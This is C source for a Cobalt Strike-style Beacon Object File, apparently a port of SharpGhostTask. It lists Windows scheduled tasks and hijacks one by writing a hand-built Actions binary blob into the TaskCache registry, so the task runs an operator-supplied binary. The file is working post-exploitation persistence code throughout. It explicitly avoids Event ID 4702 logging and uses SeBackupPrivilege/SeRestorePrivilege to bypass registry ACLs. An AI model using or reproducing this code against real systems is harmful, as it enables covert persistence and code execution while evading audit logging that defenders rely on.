/*
 * GhostTask BOF — port of dmcxblue/SharpGhostTask.
 *
 * Modifies a Windows scheduled task by writing a hand-crafted REG_BINARY
 * blob to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\
 * TaskCache\Tasks\<GUID>\Actions, redirecting execution to an operator-
 * supplied binary. Bypasses Event ID 4702 which fires only when tasks
 * are edited through the Task Scheduler API (schtasks / RegisterTask).
 *
 * Requires SYSTEM to write under TaskCache\Tasks.
 *
 * Modes (dispatched from the Python wrapper):
 *   0 = list  — walk TaskCache\Tree recursively, print every leaf task.
 *   1 = ghost — take <task_name> + <target_binary>, do the deed.
 */

#include <windows.h>
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/bofdefs.h"
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/base.c"

DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegEnumKeyExA(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void *memcpy(void *dest, const void *src, size_t n) { return MSVCRT$memcpy(dest, src, n); }
void *memset(void *s, int c, size_t n)              { MSVCRT$memset(s, c, n); return s; }

#define TREE_BASE  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"
#define TASKS_BASE "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks"
#define MAX_REG_PATH 1024
#define MAX_TASK_DEPTH 16

/* Enable a privilege by name on the current process token. Silently
   returns FALSE if the privilege isn't available in the token
   (e.g. running as a plain user). Returns TRUE only if the specific
   privilege was successfully enabled. */
static BOOL EnablePriv(LPCSTR privName)
{
    HANDLE           hTok  = NULL;
    LUID             luid  = {0};
    TOKEN_PRIVILEGES tp    = {0};
    BOOL             ok    = FALSE;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;

    if (ADVAPI32$LookupPrivilegeValueA(NULL, privName, &luid))
    {
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        ADVAPI32$AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
        /* AdjustTokenPrivileges may report success while silently skipping
           unavailable privileges — check GetLastError explicitly. */
        ok = (KERNEL32$GetLastError() == ERROR_SUCCESS);
    }

    KERNEL32$CloseHandle(hTok);
    return ok;
}

static int str_join3(char *out, int cap,
                     const char *a, const char *b, const char *c)
{
    int len = 0;
    if (a) for (const char *p = a; *p && len < cap - 1; ++p) out[len++] = *p;
    if (b) for (const char *p = b; *p && len < cap - 1; ++p) out[len++] = *p;
    if (c) for (const char *p = c; *p && len < cap - 1; ++p) out[len++] = *p;
    out[len] = '\0';
    return len;
}

/* Recursively enumerate subkeys of TREE_BASE; for any subkey that carries
   an "Id" value (i.e. is a real task, not just a folder), print the
   full task path. */
static void EnumTasksRec(const char *relPath, int depth)
{
    char  fullPath[MAX_REG_PATH];
    HKEY  hKey = NULL;
    DWORD i    = 0;
    DWORD idSize = 0;
    LONG  rc;

    if (depth > MAX_TASK_DEPTH)
        return;

    str_join3(fullPath, sizeof(fullPath), TREE_BASE,
              relPath[0] ? "\\" : "", relPath);

    rc = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath, 0,
                                KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey);
    if (rc != ERROR_SUCCESS)
        return;

    /* Leaf test: real tasks carry a REG_SZ Id value (GUID). */
    if (ADVAPI32$RegQueryValueExA(hKey, "Id", NULL, NULL, NULL, &idSize) == ERROR_SUCCESS
        && idSize > 0
        && relPath[0])
    {
        internal_printf("  \\%s\n", relPath);
    }

    while (1)
    {
        char  child[256];
        DWORD childSize = sizeof(child);
        rc = ADVAPI32$RegEnumKeyExA(hKey, i++, child, &childSize,
                                    NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS)       break;

        char nextRel[MAX_REG_PATH];
        str_join3(nextRel, sizeof(nextRel),
                  relPath, relPath[0] ? "\\" : "", child);
        EnumTasksRec(nextRel, depth + 1);
    }

    ADVAPI32$RegCloseKey(hKey);
}

static void GhostTask(const char *taskNameIn, const char *targetBinary)
{
    HKEY  hTree  = NULL;
    HKEY  hTask  = NULL;
    char  treePath[MAX_REG_PATH];
    char  taskPath[MAX_REG_PATH];
    char  idValue[128] = {0};
    DWORD idSize       = sizeof(idValue) - 1;
    DWORD idType       = 0;
    LONG  rc;

    /* Accept task name with or without a leading '\' */
    const char *name = taskNameIn;
    while (*name == '\\') name++;

    str_join3(treePath, sizeof(treePath), TREE_BASE, "\\", name);

    rc = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, treePath, 0,
                                KEY_QUERY_VALUE, &hTree);
    if (rc != ERROR_SUCCESS)
    {
        internal_printf("[-] Failed to open Tree\\%s (error %ld)\n", name, rc);
        return;
    }

    rc = ADVAPI32$RegQueryValueExA(hTree, "Id", &idType, NULL,
                                   (LPBYTE)idValue, &idSize);
    ADVAPI32$RegCloseKey(hTree);
    hTree = NULL;
    if (rc != ERROR_SUCCESS)
    {
        internal_printf("[-] Failed to read Id from Tree\\%s (error %ld)\n", name, rc);
        return;
    }
    idValue[sizeof(idValue) - 1] = '\0';

    internal_printf("[*] Task GUID: %s\n", idValue);

    str_join3(taskPath, sizeof(taskPath), TASKS_BASE, "\\", idValue);

    /* Attempt 1: plain KEY_SET_VALUE — works when we're already SYSTEM. */
    rc = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, taskPath, 0,
                                KEY_SET_VALUE, &hTask);

    if (rc == ERROR_ACCESS_DENIED)
    {
        /* Attempt 2: elevate via SeBackupPrivilege + SeRestorePrivilege and
           open with REG_OPTION_BACKUP_RESTORE — bypasses the ACL that denies
           writes to BUILTIN\Administrators on Tasks\<GUID>. Works whenever
           the token holds both privileges (any Administrator does). */
        BOOL backup  = EnablePriv("SeBackupPrivilege");
        BOOL restore = EnablePriv("SeRestorePrivilege");

        if (!backup || !restore)
        {
            internal_printf("[-] Access denied on Tasks\\%s and could not enable "
                            "SeBackupPrivilege/SeRestorePrivilege — not SYSTEM and not Admin\n",
                            idValue);
            return;
        }

        rc = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, taskPath,
                                    REG_OPTION_BACKUP_RESTORE, 0, &hTask);
        if (rc != ERROR_SUCCESS)
        {
            internal_printf("[-] Backup/restore open failed on Tasks\\%s (error %ld)\n",
                            idValue, rc);
            return;
        }
        internal_printf("[*] Elevated via SeBackupPrivilege + SeRestorePrivilege\n");
    }
    else if (rc != ERROR_SUCCESS)
    {
        internal_printf("[-] Failed to open Tasks\\%s for write (error %ld)\n",
                        idValue, rc);
        return;
    }

    /* UTF-16 LE encode the target path (no trailing null in the blob). */
    int wideCharsWithNull = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, targetBinary, -1, NULL, 0);
    if (wideCharsWithNull <= 1)
    {
        internal_printf("[-] Failed to compute UTF-16 length\n");
        ADVAPI32$RegCloseKey(hTask);
        return;
    }
    int wideChars = wideCharsWithNull - 1;
    int wideBytes = wideChars * 2;

    WCHAR *wideBuf = (WCHAR*)intAlloc(wideCharsWithNull * sizeof(WCHAR));
    if (!wideBuf)
    {
        internal_printf("[-] intAlloc(wideBuf) failed\n");
        ADVAPI32$RegCloseKey(hTask);
        return;
    }
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, targetBinary, -1, wideBuf, wideCharsWithNull);

    /* Actions blob layout (28-byte header + body + 10-byte trailer):
       [ 0- 1]  03 00                                  version marker
       [ 2- 3]  0C 00                                  author-field length (12)
       [ 4- 5]  00 00                                  padding
       [ 6-17]  "A\0u\0t\0h\0o\0r\0"                   UTF-16 LE "Author"
       [18-19]  66 66                                  task-name marker (empty)
       [20-23]  00 00 00 00                            padding
       [24-27]  NN NN NN NN                            target-path byte length, LE
       [28..]   target path bytes (UTF-16 LE, no null)
       [tail]   00 * 10                                trailer                    */
    const int HDR_LEN  = 28;
    const int TAIL_LEN = 10;
    int totalLen = HDR_LEN + wideBytes + TAIL_LEN;

    BYTE *blob = (BYTE*)intAlloc(totalLen);
    if (!blob)
    {
        intFree(wideBuf);
        internal_printf("[-] intAlloc(blob) failed\n");
        ADVAPI32$RegCloseKey(hTask);
        return;
    }

    blob[ 0] = 0x03; blob[ 1] = 0x00;
    blob[ 2] = 0x0C; blob[ 3] = 0x00;
    blob[ 4] = 0x00; blob[ 5] = 0x00;
    blob[ 6] = 'A';  blob[ 7] = 0x00;
    blob[ 8] = 'u';  blob[ 9] = 0x00;
    blob[10] = 't';  blob[11] = 0x00;
    blob[12] = 'h';  blob[13] = 0x00;
    blob[14] = 'o';  blob[15] = 0x00;
    blob[16] = 'r';  blob[17] = 0x00;
    blob[18] = 0x66; blob[19] = 0x66;
    blob[20] = 0x00; blob[21] = 0x00; blob[22] = 0x00; blob[23] = 0x00;
    blob[24] = (BYTE)( wideBytes        & 0xFF);
    blob[25] = (BYTE)((wideBytes >>  8) & 0xFF);
    blob[26] = (BYTE)((wideBytes >> 16) & 0xFF);
    blob[27] = (BYTE)((wideBytes >> 24) & 0xFF);

    memcpy(blob + HDR_LEN, wideBuf, wideBytes);
    /* trailer already zeroed by intAlloc (HEAP_ZERO_MEMORY) */

    rc = ADVAPI32$RegSetValueExA(hTask, "Actions", 0, REG_BINARY, blob, totalLen);
    if (rc == ERROR_SUCCESS)
    {
        internal_printf("[+] Ghosted task '\\%s'\n", name);
        internal_printf("    Target: %s\n", targetBinary);
        internal_printf("    (No Event ID 4702 generated — task will fire the new binary on next trigger)\n");
    }
    else
    {
        internal_printf("[-] RegSetValueExA(Actions) failed (error %ld) — needs SYSTEM\n", rc);
    }

    intFree(blob);
    intFree(wideBuf);
    ADVAPI32$RegCloseKey(hTask);
}

void go(char *args, int len)
{
    datap parser;
    int   mode;
    char *taskName  = NULL;
    char *targetBin = NULL;
    int   taskLen   = 0;
    int   targetLen = 0;

    bofstart();

    BeaconDataParse(&parser, args, len);
    mode = BeaconDataInt(&parser);

    if (mode == 0)
    {
        internal_printf("=== Scheduled Tasks (recursive) ===\n\n");
        EnumTasksRec("", 0);
        internal_printf("\n[*] Done.\n");
    }
    else if (mode == 1)
    {
        taskName  = BeaconDataExtract(&parser, &taskLen);
        targetBin = BeaconDataExtract(&parser, &targetLen);

        if (!taskName || !targetBin || taskLen <= 1 || targetLen <= 1)
        {
            internal_printf("[-] Missing task name or target binary\n");
        }
        else
        {
            GhostTask(taskName, targetBin);
        }
    }
    else
    {
        internal_printf("[-] Unknown mode: %d\n", mode);
    }

    printoutput(TRUE);
}
